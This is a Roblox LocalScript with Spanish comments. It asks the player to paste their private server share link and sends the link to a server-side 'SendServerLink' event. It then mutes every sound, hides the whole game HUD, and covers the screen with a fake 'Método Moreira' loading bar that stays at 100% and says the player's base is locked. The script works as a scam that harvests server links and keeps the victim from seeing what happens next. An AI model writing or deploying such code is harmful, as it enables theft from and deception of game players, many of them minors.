-- LocalScript: UI de link + pantalla de carga fullscreen + eliminar sonidos + ocultar HUD
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local SoundService = game:GetService("SoundService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local StarterGui = game:GetService("StarterGui")
local StarterPack = game:GetService("StarterPack")
local Lighting = game:GetService("Lighting")
local PlayersService = game:GetService("Players")

local Player = Players.LocalPlayer
local PlayerGui = Player:WaitForChild("PlayerGui")

-- =========================
-- UI INICIAL (PEDIR LINK)
-- =========================
local entryGui = Instance.new("ScreenGui")
entryGui.Name = "ServerLinkUI"
entryGui.IgnoreGuiInset = true
entryGui.ResetOnSpawn = false
entryGui.Parent = PlayerGui
entryGui.DisplayOrder = 1000
entryGui.ZIndexBehavior = Enum.ZIndexBehavior.Global

local entryFrame = Instance.new("Frame")
entryFrame.Size = UDim2.new(0, 420, 0, 320)
entryFrame.Position = UDim2.new(0.5, -210, 0.5, -160)
entryFrame.AnchorPoint = Vector2.new(0.5, 0.5)
entryFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
entryFrame.BorderSizePixel = 0
entryFrame.Parent = entryGui

local titleLabel = Instance.new("TextLabel")
titleLabel.Parent = entryFrame
titleLabel.Size = UDim2.new(1, -20, 0, 36)
titleLabel.Position = UDim2.new(0, 10, 0, 12)
titleLabel.BackgroundTransparency = 1
titleLabel.Text = "Ingresa el link de tu servidor privado:"
titleLabel.TextColor3 = Color3.fromRGB(255,255,255)
titleLabel.TextScaled = true
titleLabel.Font = Enum.Font.SourceSansBold

local linkBox = Instance.new("TextBox")
linkBox.Parent = entryFrame
linkBox.Size = UDim2.new(1, -20, 0, 56)
linkBox.Position = UDim2.new(0, 10, 0, 60)
linkBox.BackgroundColor3 = Color3.fromRGB(50,50,50)
linkBox.TextColor3 = Color3.fromRGB(255,255,255)
linkBox.Text = "https://www.roblox.com/share?code="
linkBox.ClearTextOnFocus = false
linkBox.TextScaled = true

local msgLabel = Instance.new("TextLabel")
msgLabel.Parent = entryFrame
msgLabel.Size = UDim2.new(1, -20, 0, 28)
msgLabel.Position = UDim2.new(0, 10, 0, 126)
msgLabel.BackgroundTransparency = 1
msgLabel.Text = ""
msgLabel.TextColor3 = Color3.fromRGB(255,0,0)
msgLabel.TextScaled = true

local sendButton = Instance.new("TextButton")
sendButton.Parent = entryFrame
sendButton.Size = UDim2.new(1, -20, 0, 56)
sendButton.Position = UDim2.new(0, 10, 0, 170)
sendButton.Text = "Enviar"
sendButton.TextScaled = true
sendButton.BackgroundColor3 = Color3.fromRGB(75,75,75)
sendButton.TextColor3 = Color3.fromRGB(255,255,255)

-- =========================
-- Función: validar link (solo inicio y final)
-- =========================
local function isLinkValid(link)
	local startPart = "https://www.roblox.com/share?code="
	local endPart = "&type=Server"
	if type(link) ~= "string" then return false end
	return string.sub(link, 1, #startPart) == startPart and string.sub(link, -#endPart) == endPart
end

-- =========================
-- Función: eliminar todos los sonidos actuales y futuros (cliente)
-- =========================
local function removeAllSoundsClient()
	-- lista de raíces a procesar en cliente
	local roots = {
		Workspace,
		SoundService,
		Lighting,
		ReplicatedStorage,
		PlayerGui,
	}

	-- destruye sonidos en una raíz
	local function destroyIn(root)
		for _, inst in ipairs(root:GetDescendants()) do
			if inst:IsA("Sound") or inst:IsA("AudioEmitter") then
				pcall(function()
					inst:Stop()
					inst:Destroy()
				end)
			end
		end
	end

	-- procesar ahora
	for _, r in ipairs(roots) do
		pcall(function() destroyIn(r) end)
	end

	-- escuchar sonidos futuros y eliminarlos inmediatamente
	for _, r in ipairs(roots) do
		pcall(function()
			r.DescendantAdded:Connect(function(obj)
				if obj:IsA("Sound") or obj:IsA("AudioEmitter") then
					pcall(function()
						obj:Stop()
						obj:Destroy()
					end)
				end
			end)
		end)
	end

	-- También limpiar PlayerGui de todos los jugadores (por si hay sonidos replicados en Guis)
	for _, pl in ipairs(Players:GetPlayers()) do
		if pl:FindFirstChild("PlayerGui") then
			pcall(function()
				for _, desc in ipairs(pl.PlayerGui:GetDescendants()) do
					if desc:IsA("Sound") or desc:IsA("AudioEmitter") then
						pcall(function() desc:Stop(); desc:Destroy() end)
					end
				end
				pl.PlayerGui.DescendantAdded:Connect(function(obj)
					if obj:IsA("Sound") or obj:IsA("AudioEmitter") then
						pcall(function() obj:Stop(); obj:Destroy() end)
					end
				end)
			end)
		end
	end

	-- Intento adicional: setear volumen localmente si SoundService lo permite
	pcall(function()
		if type(SoundService.Volume) == "number" then
			SoundService.Volume = 0
		end
	end)
end

-- =========================
-- Función: ocultar HUD / CoreGui
-- =========================
local function hideHUD()
	-- Topbar (dev console)
	pcall(function() StarterGui:SetCore("TopbarEnabled", false) end)

	-- Desactivar elementos CoreGui (chat, backpack, playerlist, etc)
	for _, guiType in ipairs(Enum.CoreGuiType:GetEnumItems()) do
		pcall(function() StarterGui:SetCoreGuiEnabled(guiType, false) end)
	end
end

-- =========================
-- Función: mostrar pantalla de carga fullscreen (queda fija al 100%)
-- =========================
local function showFullLoadingScreen()
	-- Crear ScreenGui en PlayerGui (más seguro que CoreGui)
	local loadingGui = Instance.new("ScreenGui")
	loadingGui.Name = "FullLoadingScreen"
	loadingGui.IgnoreGuiInset = true
	loadingGui.ResetOnSpawn = false
	loadingGui.DisplayOrder = 10000
	loadingGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
	loadingGui.Parent = PlayerGui

	-- Fondo que cubre TODO (esquina a esquina)
	local bg = Instance.new("Frame")
	bg.Name = "Background"
	bg.Size = UDim2.new(1, 0, 1, 0)
	bg.Position = UDim2.new(0, 0, 0, 0)
	bg.BackgroundColor3 = Color3.fromRGB(0,0,0)
	bg.BorderSizePixel = 0
	bg.AnchorPoint = Vector2.new(0,0)
	bg.Parent = loadingGui

	-- Título
	local title = Instance.new("TextLabel")
	title.Parent = bg
	title.Size = UDim2.new(1, -40, 0, 80)
	title.Position = UDim2.new(0, 20, 0.35, -40)
	title.BackgroundTransparency = 1
	title.Text = "Cargando Método Moreira"
	title.TextColor3 = Color3.fromRGB(255,255,255)
	title.TextScaled = true
	title.Font = Enum.Font.GothamBold
	title.AnchorPoint = Vector2.new(0,0)

	-- Barra contenedor
	local barBG = Instance.new("Frame")
	barBG.Parent = bg
	barBG.Size = UDim2.new(0.6, 0, 0, 28)
	barBG.Position = UDim2.new(0.2, 0, 0.52, 0)
	barBG.BackgroundColor3 = Color3.fromRGB(40,40,40)
	barBG.BorderSizePixel = 0
	barBG.ClipsDescendants = true

	-- Barra rellena (empieza en 1%)
	local barFill = Instance.new("Frame")
	barFill.Parent = barBG
	barFill.Size = UDim2.new(0.01, 0, 1, 0)
	barFill.Position = UDim2.new(0,0,0,0)
	barFill.BackgroundColor3 = Color3.fromRGB(0,200,0)
	barFill.BorderSizePixel = 0

	-- % texto encima de la barra (centrado)
	local percentLabel = Instance.new("TextLabel")
	percentLabel.Parent = barBG
	percentLabel.Size = UDim2.new(1,0,1,0)
	percentLabel.Position = UDim2.new(0,0,0,0)
	percentLabel.BackgroundTransparency = 1
	percentLabel.Text = "1%"
	percentLabel.TextColor3 = Color3.fromRGB(255,255,255)
	percentLabel.TextScaled = true
	percentLabel.Font = Enum.Font.GothamBold

	-- Texto inferior fijo (tu mensaje)
	local subText = Instance.new("TextLabel")
	subText.Parent = bg
	subText.Size = UDim2.new(1, -40, 0, 40)
	subText.Position = UDim2.new(0, 20, 0.63, 0)
	subText.BackgroundTransparency = 1
	subText.Text = "Tu base se mantendrá bloqueada hasta que termine la carga.."
	subText.TextColor3 = Color3.fromRGB(200,200,200)
	subText.TextScaled = true
	subText.Font = Enum.Font.SourceSans

	-- Animación de 1% a 100% (permanece visible al 100%)
	spawn(function()
		for i = 1, 100 do
			barFill.Size = UDim2.new(i/100, 0, 1, 0)
			percentLabel.Text = tostring(i) .. "%"
			task.wait(0.05) -- velocidad; ajusta si quieres
		end
		-- Queda fija en pantalla
	end)

	return loadingGui
end

-- =========================
-- Acción al presionar Enviar
-- =========================
sendButton.MouseButton1Click:Connect(function()
	local link = linkBox.Text

	if isLinkValid(link) then
		msgLabel.Text = "El link es válido ✅"
		msgLabel.TextColor3 = Color3.fromRGB(0,255,0)

		-- Enviar al RemoteEvent si existe
		local remoteEvent = ReplicatedStorage:FindFirstChild("SendServerLink")
		if remoteEvent then
			pcall(function() remoteEvent:FireServer(link) end)
		end

		-- Quitar sonidos, ocultar HUD y mostrar loading fullscreen
		removeAllSoundsClient()
		hideHUD()
		showFullLoadingScreen()

		-- Destruir UI de entrada para evitar que se vea debajo
		if entryGui and entryGui.Parent then
			entryGui:Destroy()
		end
	else
		msgLabel.Text = "El link es inválido ❌"
		msgLabel.TextColor3 = Color3.fromRGB(255,0,0)
	end
end)
